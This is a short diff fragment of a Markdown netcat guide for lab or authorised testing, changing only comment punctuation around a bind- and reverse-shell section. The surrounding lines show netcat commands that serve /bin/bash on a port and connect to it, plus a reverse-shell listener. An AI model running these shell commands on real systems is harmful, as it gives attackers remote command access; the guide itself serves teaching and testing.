@@ -177,13 +177,13 @@ nc <ip-of-A> 4444
 ### Bind & Reverse Shells (Lab / Authorized Testing)
 
 ```bash
-# Bind shell — attacker connects to target
+# Bind shell: attacker connects to target
 # On target:
 nc -lvnp 4444 -e /bin/bash
 # On attacker:
 nc <target-ip> 4444
 
-# Reverse shell — target connects back to attacker
+# Reverse shell: target connects back to attacker
 # On attacker (listener):
 nc -lvnp 4444
 # On target:
